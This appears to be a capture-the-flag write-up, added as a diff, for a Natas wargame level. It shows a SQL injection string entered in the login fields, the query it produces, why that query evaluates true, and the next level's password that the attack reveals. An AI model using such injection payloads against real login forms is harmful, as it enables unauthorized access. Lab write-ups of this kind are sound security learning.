@@ -1,0 +1,19 @@
+SQL injection
+Username: 1" OR "1" = "1
+Password: 1" OR "1" = "1
+
+Successful login! The password for natas15 is m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV
+
+Add debug variable to see see the exact query:
+POST /index.php?debug HTTP/1.1
+                      
+Executing query: SELECT * from users where username="leve1" and password="level2"
+
+The query will become:
+SELECT * from users where username="1" OR "1" = "1" and password="1" OR "1" = "1"
+
+which is equivalent to:
+
+SELECT * from users where (username="1") OR ("1" = "1" and password="1") OR ("1" = "1")
+
+False || False || True ==> True
